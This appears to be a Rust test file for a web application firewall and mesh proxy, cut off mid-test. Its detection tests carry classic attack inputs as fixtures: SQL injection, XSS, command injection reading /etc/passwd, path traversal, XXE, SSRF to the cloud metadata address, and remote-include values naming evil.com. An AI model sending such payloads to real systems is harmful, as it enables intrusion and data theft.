#[cfg(test)]
mod waf_anomaly_scoring_tests {
    use http::{HeaderMap, Method};
    use synvoid::waf::attack_detection::{
        AnomalyScoringConfig, AttackDetectionConfig, AttackDetector,
    };

    #[test]
    fn test_anomaly_scoring_default_disabled() {
        let config = AttackDetectionConfig::default();
        assert!(!config.anomaly_scoring.enabled);
        assert_eq!(config.anomaly_scoring.threshold, 100);
    }

    #[test]
    fn test_anomaly_scoring_zero_score_benign_request() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) =
            detector.check_request(&Method::GET, "/api/users/123", None, &headers, None);

        assert_eq!(score, 0);
    }

    #[test]
    fn test_anomaly_scoring_body_size_exceeded() {
        let mut config = AttackDetectionConfig::default();
        config.max_request_body_size = Some(100);
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let body = vec![0u8; 200];
        let (_, score) =
            detector.check_request(&Method::POST, "/upload", None, &headers, Some(&body));

        assert!(score >= 50);
    }

    #[test]
    fn test_anomaly_scoring_multiple_attacks() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::GET,
            "/search?q=1'%20OR%20'1'='1",
            Some("q=1'%20OR%20'1'='1"),
            &headers,
            None,
        );

        assert!(score >= 50);
    }

    #[test]
    fn test_anomaly_scoring_query_string_sqli() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) =
            detector.check_request(&Method::GET, "/search", Some("q=admin'--"), &headers, None);

        assert!(score >= 50);
    }

    #[test]
    fn test_anomaly_scoring_xss_attack() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::GET,
            "/search",
            Some("q=<script>alert(1)</script>"),
            &headers,
            None,
        );

        assert!(score >= 50);
    }

    #[test]
    fn test_anomaly_scoring_cmd_injection() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::GET,
            "/ping",
            Some("host=localhost;cat%20/etc/passwd"),
            &headers,
            None,
        );

        assert!(score >= 50);
    }

    #[test]
    fn test_anomaly_scoring_accumulation() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::POST,
            "/search?q=<script>alert('xss')</script>",
            Some("q=<script>alert('xss')</script>"),
            &headers,
            Some(b"1' OR '1'='1"),
        );

        assert!(score >= 100);
    }

    #[test]
    fn test_anomaly_scoring_threshold_based() {
        let mut config = AttackDetectionConfig::default();
        config.anomaly_scoring.enabled = true;
        config.anomaly_scoring.threshold = 150;

        let threshold = config.anomaly_scoring.threshold;
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::GET,
            "/search?q=1'%20OR%20'1'='1",
            Some("q=1'%20OR%20'1'='1"),
            &headers,
            None,
        );

        assert!(score < threshold);
    }

    #[test]
    fn test_anomaly_scoring_disabled_detector() {
        let mut config = AttackDetectionConfig::default();
        config.enabled = false;
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::GET,
            "/search?q=<script>alert('xss')</script>",
            Some("q=<script>alert('xss')</script>"),
            &headers,
            None,
        );

        assert_eq!(score, 0);
    }

    #[test]
    fn test_anomaly_scoring_with_headers() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let mut headers = HeaderMap::new();
        headers.insert("x-forwarded-for", "127.0.0.1".parse().unwrap());

        let (_, score) =
            detector.check_request(&Method::GET, "/api/data", Some("id=123"), &headers, None);

        assert!(score >= 0);
    }

    #[test]
    fn test_anomaly_scoring_path_traversal() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::GET,
            "/files/../../etc/passwd",
            None,
            &headers,
            None,
        );

        assert!(score >= 40);
    }

    #[test]
    fn test_anomaly_scoring_ssrf() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (_, score) = detector.check_request(
            &Method::GET,
            "/proxy",
            Some("url=http://169.254.169.254/latest/meta-data"),
            &headers,
            None,
        );

        assert!(score >= 45);
    }
}

#[cfg(test)]
mod waf_streaming_tests {
    use std::sync::Arc;
    use synvoid::waf::attack_detection::{
        AttackDetectionConfig, AttackDetector, StreamingWafDecision,
    };

    #[test]
    fn test_streaming_waf_multiple_chunks_sqli() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming();

        let result = streaming.scan_chunk(b"SELECT * FROM users WHERE ");
        assert!(matches!(result, StreamingWafDecision::Continue));

        let result = streaming.scan_chunk(b"id = '1' OR '1'='1'");
        assert!(matches!(result, StreamingWafDecision::Block(..)));
    }

    #[test]
    fn test_streaming_waf_multiple_chunks_xss() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming();

        streaming.scan_chunk(b"<script>");
        let result = streaming.scan_chunk(b"alert('xss')</script>");
        assert!(matches!(result, StreamingWafDecision::Block(..)));
    }

    #[test]
    fn test_streaming_waf_state_persistence() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming();

        assert_eq!(streaming.bytes_seen(), 0);
        assert_eq!(streaming.chunks_processed(), 0);

        streaming.scan_chunk(b"first chunk");
        assert_eq!(streaming.bytes_seen(), 11);
        assert_eq!(streaming.chunks_processed(), 1);

        streaming.scan_chunk(b"second chunk");
        assert_eq!(streaming.bytes_seen(), 23);
        assert_eq!(streaming.chunks_processed(), 2);

        let result = streaming.finalize();
        assert!(result.is_none());
    }

    #[test]
    fn test_streaming_waf_large_body_handling() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming_with_config(1024, 5);

        for i in 0..5 {
            let chunk = format!("chunk{} data with some content here ", i);
            let result = streaming.scan_chunk(chunk.as_bytes());
            assert!(matches!(result, StreamingWafDecision::Continue));
        }

        let result = streaming.scan_chunk(b"final chunk");
        assert!(matches!(result, StreamingWafDecision::Block(413, _)));
    }

    #[test]
    fn test_streaming_waf_finalize_returns_detection() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming();

        streaming.scan_chunk(b"1' OR '1'='1");
        let result = streaming.finalize();

        assert!(result.is_some());
        let detection = result.unwrap();
        assert_eq!(
            detection.attack_type,
            synvoid::waf::attack_detection::AttackType::Sqli
        );
    }

    #[test]
    fn test_streaming_waf_reset_clears_state() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming();

        streaming.scan_chunk(b"some data");
        assert_eq!(streaming.chunks_processed(), 1);

        streaming.reset();

        assert_eq!(streaming.chunks_processed(), 0);
        assert_eq!(streaming.bytes_seen(), 0);
        assert!(streaming.finalize().is_none());
    }

    #[test]
    fn test_streaming_waf_binary_data() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming();

        let binary_data: Vec<u8> = (0..255).collect();
        let result = streaming.scan_chunk(&binary_data);

        assert!(matches!(result, StreamingWafDecision::Continue));
    }

    #[test]
    fn test_streaming_waf_utf8_lossy_conversion() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming = detector.streaming();

        let invalid_utf8: Vec<u8> = vec![0x80, 0x81, 0x82, 0xFF, 0xFE];
        let result = streaming.scan_chunk(&invalid_utf8);

        assert!(matches!(result, StreamingWafDecision::Continue));
    }

    #[test]
    fn test_streaming_waf_order_matters() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));
        let streaming1 = detector.clone().streaming();
        let streaming2 = detector.streaming();

        streaming1.scan_chunk(b"1' OR '1'='1");
        let result1 = streaming1.finalize();

        streaming2.scan_chunk(b"1' OR");
        streaming2.scan_chunk(b" '1'='1");
        let result2 = streaming2.finalize();

        assert!(result1.is_some());
        assert!(result2.is_some());
    }

    #[test]
    fn test_streaming_waf_config_chunk_size() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));

        let streaming = detector.streaming_with_config(512, 10);

        let chunk = vec![0u8; 512];
        let result = streaming.scan_chunk(&chunk);
        assert!(matches!(result, StreamingWafDecision::Continue));
        assert_eq!(streaming.bytes_seen(), 512);
    }

    #[test]
    fn test_streaming_waf_with_custom_config() {
        let config = AttackDetectionConfig::default();
        let detector = Arc::new(AttackDetector::new(config));

        let streaming = detector.streaming_with_config(256, 3);

        for i in 0..3 {
            let result = streaming.scan_chunk(format!("data chunk {}", i).as_bytes());
            assert!(matches!(result, StreamingWafDecision::Continue));
        }

        let result = streaming.scan_chunk(b"overflow");
        assert!(matches!(result, StreamingWafDecision::Block(413, _)));
    }
}

#[cfg(test)]
mod waf_false_positive_tests {
    use http::{HeaderMap, Method};
    use synvoid::waf::attack_detection::{AttackDetectionConfig, AttackDetector};

    #[test]
    fn test_false_positive_normal_api_request() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(
            &Method::GET,
            "/api/v1/users/123/profile",
            Some("fields=name,email&limit=10"),
            &headers,
            None,
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_javascript_variable() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(&Method::GET, "/js/app.js", None, &headers, None);

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_email_address() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(
            &Method::POST,
            "/api/users",
            None,
            &headers,
            Some(b"email=user@example.com&name=John"),
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_sql_keywords_in_text() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(
            &Method::GET,
            "/search",
            Some("q=The+SELECT+statement+is+used+to+SELECT+data"),
            &headers,
            None,
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_html_in_blog_post() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let body = b"Its <b>bold</b> and <i>italic</i> text with <p>paragraphs</p>";
        let (result, _) =
            detector.check_request(&Method::POST, "/api/posts", None, &headers, Some(body));

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_json_data() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let body =
            br#"{"username": "john_doe", "email": "john@example.com", "bio": "I <3 coding"}"#;
        let (result, _) =
            detector.check_request(&Method::POST, "/api/profile", None, &headers, Some(body));

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_url_with_equals() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(
            &Method::GET,
            "/api/search",
            Some("filter=status=active&sort=date"),
            &headers,
            None,
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_path_with_dots() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(
            &Method::GET,
            "/files/docs/v1.2.3/release-notes.html",
            None,
            &headers,
            None,
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_comment_with_code() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let body = b"<!-- TODO: fix the SELECT query issue -->";
        let (result, _) =
            detector.check_request(&Method::POST, "/api/comments", None, &headers, Some(body));

        assert!(result.is_none());
    }

    #[test]
    fn test_false_positive_url_encoding_normal_text() {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(
            &Method::GET,
            "/search",
            Some("q=hello%20world%21"),
            &headers,
            None,
        );

        assert!(result.is_none());
    }
}

#[cfg(test)]
mod mesh_proxy_circuit_breaker_tests {
    use std::time::Instant;
    use synvoid::mesh::proxy::{CircuitState, ProviderStats, BLOCK_BROADCAST_FAILURE_THRESHOLD};

    #[test]
    fn test_provider_stats_initial_state() {
        let stats = ProviderStats {
            total_requests: 0,
            successful_requests: 0,
            consecutive_failures: 0,
            consecutive_successes: 0,
            last_failure: None,
            last_success: None,
            circuit_state: CircuitState::Closed,
            circuit_open_until: None,
            half_open_requests: 0,
        };

        assert_eq!(stats.success_rate(), 1.0);
    }

    #[test]
    fn test_provider_stats_success_rate_calculation() {
        let stats = ProviderStats {
            total_requests: 100,
            successful_requests: 95,
            consecutive_failures: 0,
            consecutive_successes: 5,
            last_failure: None,
            last_success: Some(Instant::now()),
            circuit_state: CircuitState::Closed,
            circuit_open_until: None,
            half_open_requests: 0,
        };

        assert!((stats.success_rate() - 0.95).abs() < 0.001);
    }

    #[test]
    fn test_provider_stats_is_available_closed() {
        let stats = ProviderStats {
            total_requests: 10,
            successful_requests: 10,
            consecutive_failures: 0,
            consecutive_successes: 0,
            last_failure: None,
            last_success: Some(Instant::now()),
            circuit_state: CircuitState::Closed,
            circuit_open_until: None,
            half_open_requests: 0,
        };

        assert!(stats.is_available(3));
    }

    #[test]
    fn test_provider_stats_is_available_half_open() {
        let mut stats = ProviderStats {
            total_requests: 10,
            successful_requests: 5,
            consecutive_failures: 5,
            consecutive_successes: 0,
            last_failure: Some(Instant::now()),
            last_success: None,
            circuit_state: CircuitState::HalfOpen,
            circuit_open_until: None,
            half_open_requests: 1,
        };

        assert!(stats.is_available(3));
        stats.half_open_requests = 3;
        assert!(!stats.is_available(3));
    }

    #[test]
    fn test_provider_stats_record_success_circuit_closed() {
        let mut stats = ProviderStats {
            total_requests: 10,
            successful_requests: 10,
            consecutive_failures: 3,
            consecutive_successes: 0,
            last_failure: Some(Instant::now()),
            last_success: None,
            circuit_state: CircuitState::Closed,
            circuit_open_until: None,
            half_open_requests: 0,
        };

        stats.record_success(2, 30);

        assert_eq!(stats.total_requests, 11);
        assert_eq!(stats.successful_requests, 11);
        assert_eq!(stats.consecutive_failures, 0);
    }

    #[test]
    fn test_provider_stats_record_success_half_open_circuit_close() {
        let mut stats = ProviderStats {
            total_requests: 10,
            successful_requests: 5,
            consecutive_failures: 5,
            consecutive_successes: 0,
            last_failure: Some(Instant::now()),
            last_success: None,
            circuit_state: CircuitState::HalfOpen,
            circuit_open_until: Some(Instant::now()),
            half_open_requests: 2,
        };

        stats.record_success(2, 30);
        assert_eq!(stats.consecutive_successes, 1);

        stats.record_success(2, 30);
        assert_eq!(stats.circuit_state, CircuitState::Closed);
        assert_eq!(stats.consecutive_successes, 0);
        assert_eq!(stats.half_open_requests, 0);
    }

    #[test]
    fn test_provider_stats_record_failure_circuit_open() {
        let mut stats = ProviderStats {
            total_requests: 10,
            successful_requests: 10,
            consecutive_failures: 2,
            consecutive_successes: 0,
            last_failure: None,
            last_success: Some(Instant::now()),
            circuit_state: CircuitState::Closed,
            circuit_open_until: None,
            half_open_requests: 0,
        };

        stats.record_failure(3, 30);

        assert_eq!(stats.circuit_state, CircuitState::Closed);
        assert_eq!(stats.consecutive_failures, 3);

        stats.record_failure(3, 30);
        assert_eq!(stats.circuit_state, CircuitState::Open);
        assert!(stats.circuit_open_until.is_some());
    }

    #[test]
    fn test_provider_stats_record_failure_half_open() {
        let mut stats = ProviderStats {
            total_requests: 10,
            successful_requests: 5,
            consecutive_failures: 0,
            consecutive_successes: 1,
            last_failure: None,
            last_success: Some(Instant::now()),
            circuit_state: CircuitState::HalfOpen,
            circuit_open_until: Some(Instant::now()),
            half_open_requests: 1,
        };

        stats.record_failure(3, 30);

        assert_eq!(stats.circuit_state, CircuitState::Open);
        assert_eq!(stats.consecutive_successes, 0);
    }

    #[test]
    fn test_provider_stats_decay() {
        let mut stats = ProviderStats {
            total_requests: 100,
            successful_requests: 50,
            consecutive_failures: 5,
            consecutive_successes: 0,
            last_failure: Some(Instant::now() - std::time::Duration::from_secs(400)),
            last_success: Some(Instant::now() - std::time::Duration::from_secs(400)),
            circuit_state: CircuitState::Closed,
            circuit_open_until: None,
            half_open_requests: 0,
        };

        stats.decay();

        assert!(stats.successful_requests <= 49);
        assert!(stats.total_requests <= 99);
    }

    #[test]
    fn test_block_broadcast_threshold_constant() {
        assert_eq!(BLOCK_BROADCAST_FAILURE_THRESHOLD, 5);
    }

    #[test]
    fn test_circuit_state_variants() {
        assert_eq!(CircuitState::Closed, CircuitState::Closed);
        assert_eq!(CircuitState::Open, CircuitState::Open);
        assert_eq!(CircuitState::HalfOpen, CircuitState::HalfOpen);
    }
}

#[cfg(test)]
mod mesh_proxy_tiered_cache_tests {
    use bytes::Bytes;
    use synvoid::mesh::proxy::{TieredTransformCache, TransformCacheEntry};

    #[test]
    fn test_tiered_cache_creation() {
        let cache = TieredTransformCache::new();
        assert_eq!(cache.l1_len(), 0);
        assert_eq!(cache.l2_len(), 0);
    }

    #[test]
    fn test_tiered_cache_insert_and_get_l1() {
        let cache = TieredTransformCache::new();

        cache.insert(
            "key1".to_string(),
            TransformCacheEntry {
                body: Bytes::from_static(b"value1"),
                content_encoding: Some("gzip".to_string()),
                content_type: Some("text/html".to_string()),
            },
        );

        assert_eq!(cache.l1_len(), 1);
        let entry = cache.get("key1");
        assert!(entry.is_some());
        assert_eq!(entry.unwrap().body.as_ref(), b"value1");
    }

    #[test]
    fn test_tiered_cache_l2_promotion() {
        let cache = TieredTransformCache::new();

        cache.insert(
            "key2".to_string(),
            TransformCacheEntry {
                body: Bytes::from_static(b"value2"),
                content_encoding: None,
                content_type: None,
            },
        );

        assert!(cache.l2_len() >= 1);
        assert!(cache.l1_len() >= 1);

        let entry = cache.get("key2");
        assert!(entry.is_some());
    }

    #[test]
    fn test_tiered_cache_miss() {
        let cache = TieredTransformCache::new();

        let entry = cache.get("nonexistent");
        assert!(entry.is_none());
    }

    #[test]
    fn test_tiered_cache_multiple_keys() {
        let cache = TieredTransformCache::new();

        for i in 0..10 {
            cache.insert(
                format!("key{}", i),
                TransformCacheEntry {
                    body: Bytes::from(format!("value{}", i)),
                    content_encoding: None,
                    content_type: None,
                },
            );
        }

        assert!(cache.l1_len() >= 1);
        assert!(cache.l2_len() >= 1);
    }

    #[test]
    fn test_tiered_cache_preserves_metadata() {
        let cache = TieredTransformCache::new();

        cache.insert(
            "html".to_string(),
            TransformCacheEntry {
                body: Bytes::from_static(b"<html>test</html>"),
                content_encoding: Some("gzip".to_string()),
                content_type: Some("text/html".to_string()),
            },
        );

        let entry = cache.get("html").unwrap();
        assert_eq!(entry.content_encoding.as_deref(), Some("gzip"));
        assert_eq!(entry.content_type.as_deref(), Some("text/html"));
    }
}

#[cfg(test)]
mod waf_attack_coverage_tests {
    use http::{HeaderMap, Method};
    use synvoid::waf::attack_detection::{AttackDetectionConfig, AttackDetector, AttackType};

    fn check_detects_attack(
        path: &str,
        query: Option<&str>,
        body: Option<&[u8]>,
        expected_type: AttackType,
    ) {
        let config = AttackDetectionConfig::default();
        let detector = AttackDetector::new(config);
        let headers = HeaderMap::new();

        let (result, _) = detector.check_request(&Method::GET, path, query, &headers, body);

        assert!(
            result.is_some(),
            "Expected {:?} to be detected in path: {}, query: {:?}",
            expected_type,
            path,
            query
        );
        assert_eq!(result.unwrap().attack_type, expected_type);
    }

    #[test]
    fn test_sqli_union_based() {
        check_detects_attack(
            "/search",
            Some("q=1 UNION SELECT password FROM users"),
            None,
            AttackType::Sqli,
        );
    }

    #[test]
    fn test_sqli_boolean_based() {
        check_detects_attack("/search", Some("q=test' AND 1=1--"), None, AttackType::Sqli);
    }

    #[test]
    fn test_sqli_time_based() {
        check_detects_attack(
            "/search",
            Some("q=test' AND SLEEP(5)--"),
            None,
            AttackType::Sqli,
        );
    }

    #[test]
    fn test_xss_script_tag() {
        check_detects_attack(
            "/comment",
            Some("text=<script>alert(1)</script>"),
            None,
            AttackType::Xss,
        );
    }

    #[test]
    fn test_xss_img_onerror() {
        check_detects_attack(
            "/profile",
            Some("name=<img src=x onerror=alert(1)>"),
            None,
            AttackType::Xss,
        );
    }

    #[test]
    fn test_path_traversal_encoded() {
        check_detects_attack(
            "/files",
            Some("file=..%2f..%2fetc%2fpasswd"),
            None,
            AttackType::PathTraversal,
        );
    }

    #[test]
    fn test_path_traversal_double_encoded() {
        check_detects_attack(
            "/files",
            Some("file=..%252f..%252fetc%252fpasswd"),
            None,
            AttackType::PathTraversal,
        );
    }

    #[test]
    fn test_cmd_injection_semicolon() {
        check_detects_attack(
            "/ping",
            Some("host=localhost;cat /etc/passwd"),
            None,
            AttackType::CmdInjection,
        );
    }

    #[test]
    fn test_cmd_injection_pipe() {
        check_detects_attack(
            "/ping",
            Some("host=localhost | ls -la"),
            None,
            AttackType::CmdInjection,
        );
    }

    #[test]
    fn test_xxe_external_entity() {
        check_detects_attack(
            "/api/xml",
            Some("data=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
            None,
            AttackType::Xxe,
        );
    }

    #[test]
    fn test_ssti_handlebars() {
        check_detects_attack("/template", Some("tpl={{7*7}}"), None, AttackType::Ssti);
    }

    #[test]
    fn test_ssti_jinja() {
        check_detects_attack("/template", Some("tpl={{7*7}}"), None, AttackType::Ssti);
    }

    #[test]
    fn test_ssrf_private_ip() {
        check_detects_attack(
            "/proxy",
            Some("url=http://192.168.1.1/internal/api"),
            None,
            AttackType::Rfi,
        );
    }

    #[test]
    fn test_ssrf_metadata_endpoint() {
        check_detects_attack(
            "/proxy",
            Some("url=http://169.254.169.254/latest/meta-data"),
            None,
            AttackType::Rfi,
        );
    }

    #[test]
    fn test_open_redirect_with_protocol() {
        check_detects_attack(
            "/redirect",
            Some("url=http://evil.com"),
            None,
            AttackType::OpenRedirect,
        );
    }

    #[test]
    fn test_open_redirect_with_data_protocol() {
        check_detects_attack(
            "/redirect",
            Some("url=javascript:alert(1)"),
            None,
            AttackType::OpenRedirect,
        );
    }

    #[test]
    fn test_ldap_injection() {
        check_detects_attack(
            "/login",
            Some("username=admin)(&password=123"),
            None,
            AttackType::LdapInjection,
        );
    }

    #[test]
    fn test_xpath_injection() {
        check_detects_attack(
            "/search",
            Some("q=' or //user[@password]"),
            None,
            AttackType::XPathInjection,
        );
    }

    #[test]
    fn test_rfi_remote_include() {
        check_detects_attack(
            "/page",
            Some("file=http://evil.com/shell.txt"),
            None,
            AttackType::Rfi,
        );
    }
}

#[cfg(test)]
mod concurrent_dashmap_tests {
    use dashmap::DashMap;
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::sync::Arc;
    use std::thread;

    #[test]
    fn test_dashmap_concurrent_read_write() {
        let map: DashMap<String, u64> = DashMap::new();
        let map = Arc::new(map);

        let handles: Vec<_> = (0..10)
            .map(|i| {
                let map = Arc::clone(&map);
                thread::spawn(move || {
                    for j in 0..1000 {
                        map.insert(format!("key{}{}", i, j), (i * 1000 + j) as u64);
                    }
                })
            })
            .collect();

        for h in handles {
            h.join().unwrap();
        }

        assert_eq!(map.len(), 10000);
    }

    #[test]
    fn test_dashmap_concurrent_read_only() {
        let map: DashMap<String, u64> = DashMap::new();
        for i in 0..1000 {
            map.insert(format!("key{}", i), i as u64);
        }

        let map = Arc::new(map);
        let counter = Arc::new(AtomicU64::new(0));

        let handles: Vec<_> = (0..10)
            .map(|_| {
                let map = Arc::clone(&map);
                let counter = Arc::clone(&counter);
                thread::spawn(move || {
                    for _ in 0..1000 {
                        for entry in map.iter() {
                            let _ = entry.value();
                            counter.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                })
            })
            .collect();

        for h in handles {
            h.join().unwrap();
        }

        assert!(counter.load(Ordering::Relaxed) > 0);
    }

    #[test]
    fn test_dashmap_sequential_insertions() {
        let map: DashMap<String, u64> = DashMap::new();

        for i in 0..1000 {
            map.insert(format!("key{}", i), i as u64);
        }

        assert_eq!(map.len(), 1000);

        for i in 0..1000 {
            let value = map.get(format!("key{}", i).as_str());
            assert!(value.is_some());
            assert_eq!(*value.unwrap(), i as u64);
        }
    }

    #[test]
    fn test_dashmap_remove_operations() {
        let map: DashMap<String, u64> = DashMap::new();

        for i in 0..100 {
            map.insert(format!("key{}", i), i as u64);
        }

        assert_eq!(map.len(), 100);

        for i in 0..50 {
            map.remove(format!("key{}", i).as_str());
        }

        assert_eq!(map.len(), 50);

        for i in 50..100 {
            assert!(map.contains_key(format!("key{}", i).as_str()));
        }
    }

    #[test]
    fn test_dashmap_modify_in_place() {
        let map: DashMap<String, u64> = DashMap::new();

        for i in 0..100 {
            map.insert(format!("key{}", i), i as u64);
        }

        for entry in map.iter() {
            let key = entry.key().clone();
            let new_value = *entry.value() * 2;
            map.insert(key, new_value);
        }

        for i in 0..100 {
            let value = map.get(format!("key{}", i).as_str()).unwrap();
            assert_eq!(*value, (i as u64) * 2);
        }
    }
}

#[cfg(test)]
mod wasm_pool_contention_tests {
    use parking_lot::RwLock;
    use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
    use std::sync::Arc;
    use std::thread;

    #[derive(Clone)]
    struct WasmInstance {
        id: u64,
    }

    struct WasmInstancePool {
        instances: RwLock<Vec<WasmInstance>>,
        in_use: AtomicUsize,
    }

    impl WasmInstancePool {
        fn new(pool_size: usize) -> Self {
            let instances: Vec<_> = (0..pool_size)
                .map(|i| WasmInstance { id: i as u64 })
                .collect();
            Self {
                instances: RwLock::new(instances),
                in_use: AtomicUsize::new(0),
            }
        }

        fn acquire(&self) -> Option<WasmInstance> {
            let mut instances = self.instances.write();
            if let Some(instance) = instances.pop() {
                self.in_use.fetch_add(1, Ordering::Relaxed);
                Some(instance)
            } else {
                None
            }
        }

        fn release(&self, instance: WasmInstance) {
            let mut instances = self.instances.write();
            instances.push(instance);
            self.in_use.fetch_sub(1, Ordering::Relaxed);
        }

        fn in_use_count(&self) -> usize {
            self.in_use.load(Ordering::Relaxed)
        }
    }

    #[test]
    fn test_wasm_pool_acquire_release() {
        let pool = Arc::new(WasmInstancePool::new(5));

        let instance1 = pool.acquire();
        assert!(instance1.is_some());
        assert_eq!(pool.in_use_count(), 1);

        let instance2 = pool.acquire();
        assert!(instance2.is_some());
        assert_eq!(pool.in_use_count(), 2);

        pool.release(instance1.unwrap());
        assert_eq!(pool.in_use_count(), 1);

        pool.release(instance2.unwrap());
        assert_eq!(pool.in_use_count(), 0);
    }

    #[test]
    fn test_wasm_pool_allocation() {
        let pool = Arc::new(WasmInstancePool::new(10));

        let mut acquired: Vec<WasmInstance> = Vec::new();
        for _ in 0..10 {
            if let Some(instance) = pool.acquire() {
                acquired.push(instance);
            }
        }

        assert_eq!(pool.in_use_count(), 10);

        for instance in acquired.drain(..) {
            pool.release(instance);
        }

        assert_eq!(pool.in_use_count(), 0);
    }

    #[test]
    fn test_wasm_pool_exhaustion() {
        let pool = Arc::new(WasmInstancePool::new(3));

        let inst1 = pool.acquire();
        let inst2 = pool.acquire();
        let inst3 = pool.acquire();

        assert!(inst1.is_some());
        assert!(inst2.is_some());
        assert!(inst3.is_some());
        assert!(pool.acquire().is_none());

        pool.release(inst1.unwrap());
        let inst4 = pool.acquire();
        assert!(inst4.is_some());
    }

    #[test]
    fn test_wasm_pool_concurrent_access() {
        let pool = Arc::new(WasmInstancePool::new(100));
        let acquired_count = Arc::new(AtomicU64::new(0));
        let released_count = Arc::new(AtomicU64::new(0));

        let handles: Vec<_> = (0..20)
            .map(|_| {
                let pool = Arc::clone(&pool);
                let acquired_count = Arc::clone(&acquired_count);
                let released_count = Arc::clone(&released_count);
                thread::spawn(move || {
                    let mut local_acquired = 0;
                    let mut local_released = 0;
                    let mut instances: Vec<WasmInstance> = Vec::new();

                    for _ in 0..50 {
                        if let Some(instance) = pool.acquire() {
                            local_acquired += 1;
                            instances.push(instance);
                        }
                    }

                    for instance in instances.drain(..) {
                        pool.release(instance);
                        local_released += 1;
                    }

                    acquired_count.fetch_add(local_acquired, Ordering::Relaxed);
                    released_count.fetch_add(local_released, Ordering::Relaxed);
                })
            })
            .collect();

        for h in handles {
            h.join().unwrap();
        }

        assert_eq!(acquired_count.load(Ordering::Relaxed), 1000);
        assert_eq!(released_count.load(Ordering::Relaxed), 1000);
        assert_eq!(pool.in_use_count(), 0);
    }
}

#[cfg(test)]
mod proxy_cache_key_construction_tests {
    fn build_cache_key(method: &str, scheme: &str, host: &str, uri: &str) -> String {
        format!("{}:{}:{}:{}", scheme, method, host, uri)
    }

    #[test]
    fn test_cache_key_basic() {
        let key = build_cache_key("GET", "https", "example.com", "/api/users");
        assert_eq!(key, "https:GET:example.com:/api/users");
    }

    #[test]
    fn test_cache_key_different_methods() {
        let get_key = build_cache_key("GET", "https", "example.com", "/api/data");
        let post_key = build_cache_key("POST", "https", "example.com", "/api/data");
        let put_key = build_cache_key("PUT", "https", "example.com", "/api/data");
        let delete_key = build_cache_key("DELETE", "https", "example.com", "/api/data");

        assert_ne!(get_key, post_key);
        assert_ne!(get_key, put_key);
        assert_ne!(get_key, delete_key);
    }

    #[test]
    fn test_cache_key_different_hosts() {
        let key1 = build_cache_key("GET", "https", "api.example.com", "/users");
